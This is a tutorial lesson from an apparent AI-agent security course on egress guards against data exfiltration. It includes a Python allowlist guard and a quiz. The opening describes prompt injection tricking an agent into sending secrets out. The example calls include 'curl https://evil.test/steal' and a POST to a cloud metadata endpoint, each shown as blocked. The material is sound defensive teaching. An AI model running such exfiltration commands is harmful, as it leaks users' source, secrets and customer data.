# Data exfiltration & egress guards

> **Motto** — The payoff of most attacks is sending your data out — block the exit.

*Part of Phase 17 — Security & Alignment.*

## The Problem

The goal of a successful prompt injection is usually **exfiltration** — tricking the agent
into sending your source, secrets, or customer data to an attacker. This can happen through
a `curl` to their server, a crafted URL, or an email. Output-as-data (lesson 02) stops
arbitrary execution. An **egress guard** stops the specific dangerous action of reaching a
non-allowlisted destination, at the moment the agent tries it.

## The Concept

<style>
.dgm-exf{background:#ffffff;border:1px solid #d1d9e0;border-top:3px solid #008300;
  border-radius:16px;padding:28px 26px 22px;box-shadow:0 1px 3px rgba(31,35,40,.04),0 8px 24px rgba(31,35,40,.04);
  margin:26px 0;max-width:100%;font-family:inherit;text-align:left;position:relative}
.dgm-exf-chip{position:absolute;top:-11px;left:24px;background:#008300;color:#ffffff;
  font-size:10.5px;font-weight:700;letter-spacing:1px;text-transform:uppercase;
  border-radius:20px;padding:3px 12px;box-shadow:0 2px 6px rgba(0,131,0,.28)}
.dgm-exf h4{margin:0 0 4px;font-size:11px;font-weight:700;letter-spacing:.4px;text-transform:uppercase;color:#59636e}
.dgm-exf-sub{font-size:12px;color:#59636e;margin:0 0 16px}
.dgm-exf-q{background:#f6f8fa;border:1px dashed #d1d9e0;border-radius:10px;padding:9px 14px;text-align:center;
  font-size:11px;font-weight:700;color:#1f2328;margin-bottom:10px}
.dgm-exf-branches{display:grid;grid-template-columns:repeat(2,1fr);gap:10px}
.dgm-exf-b{border-radius:11px;padding:11px 13px;border:1.5px solid}
.dgm-exf-b h6{margin:0 0 4px;font-size:10.5px;font-weight:700}
.dgm-exf-b p{margin:0;font-size:10px;color:#59636e;line-height:1.35}
.dgm-exf-b.accent{background:#e6f5e6;border-color:#a8d8a8}
.dgm-exf-b.accent h6{color:#0d5c0d}
.dgm-exf-b.blue{background:#ddf4ff;border-color:#b6e3ff}
.dgm-exf-b.blue h6{color:#0550ae}
.dgm-exf-b.green{background:#dafbe1;border-color:#aceebb}
.dgm-exf-b.green h6{color:#1a614f}
.dgm-exf-b.red{background:#ffebe9;border-color:#ffcecb}
.dgm-exf-b.red h6{color:#82061e}
.dgm-exf-b.neutral{background:#f6f8fa;border-color:#d1d9e0}
.dgm-exf-b.neutral h6{color:#1f2328}
@media (max-width:640px){.dgm-exf{padding:20px 16px 18px}.dgm-exf-branches{grid-template-columns:1fr}}
</style>
<div class="dgm-exf">
  <span class="dgm-exf-chip">Every outbound call passes the egress guard</span>
  <h4>A network call or URL only goes out if the destination is allowlisted</h4>
  <p class="dgm-exf-sub">Default-deny plus an alert on denial is what turns a blocked attempt into a visible one.</p>
  <div class="dgm-exf-q">Agent action: network call / URL → egress guard — destination allowlisted?</div>
  <div class="dgm-exf-branches">
    <div class="dgm-exf-b green">
      <h6>Yes</h6>
      <p>Permit</p>
    </div>
    <div class="dgm-exf-b red">
      <h6>No</h6>
      <p>Deny + alert (default-deny)</p>
    </div>
  </div>
</div>


This is the Phase 7 egress concept reframed as a *security* control. Deny outbound traffic
by default, allowlist the few hosts you trust, and apply the check as a pre-action guard.

## Build It

`code/exfil_guard.py` — a guard that inspects a proposed action for non-allowlisted egress:

```python
import re

ALLOWED_HOSTS = {"github.com", "api.anthropic.com", "registry.npmjs.org"}

def find_egress(text):
    return re.findall(r"https?://([a-zA-Z0-9.-]+)", text)

def guard(action_text):
    for host in find_egress(action_text):
        if host not in ALLOWED_HOSTS:
            return {"allow": False, "reason": f"blocked egress to {host} (not allowlisted)"}
    return {"allow": True}
```

```python
print(guard("curl https://github.com/repo"))         # allow
print(guard("curl https://evil.test/steal"))         # blocked
print(guard("POST data to http://169.254.169.254"))  # blocked (metadata endpoint!)
```

Default-deny is the rule. An unrecognized host — including cloud metadata endpoints like
`169.254.169.254` — gets blocked, so an injected exfiltration attempt simply fails.

## Use It

Wire this as a PreToolUse hook on the Bash and network tools (Phase 8) — the harness-side
belt. Also enforce a real network policy at the infrastructure layer (Phase 7, or Claude
Code on the web's network policy), which an attacker can't talk past. This is defense in
depth: the guard catches the obvious, and the network policy catches the rest.

## Ship It

[`code/exfil_guard.py`](../../03-exfiltration/code/exfil_guard.py) — an egress allowlist guard.

## Check Yourself

**Q1.** The usual *payoff* of a prompt injection is…

- A) slower responses
- B) exfiltration — sending your data to an attacker-controlled destination
- C) a typo
- D) higher cost

<details><summary>Answer</summary>B — block the exit to defuse the attack.</details>

**Q2.** The right default for outbound destinations is…

- A) allow all
- B) default-deny with a trusted allowlist
- C) block only known-bad
- D) no policy

<details><summary>Answer</summary>B — allowlist, don't blocklist.</details>

**Challenge.** Add detection for exfiltration via DNS/encoded payloads (e.g. a long
base64 subdomain) and explain why a network-layer policy is still required.

## Related

- Builds on: Phase 7 — [Egress control](../../../07-shell-and-sandbox-execution/06-egress-control/docs/en.md), [Output as data](../../02-output-as-data/docs/en.md)
- Next: [Secret redaction](../../04-secret-redaction/docs/en.md)
- [Roadmap](../../../../ROADMAP.md)
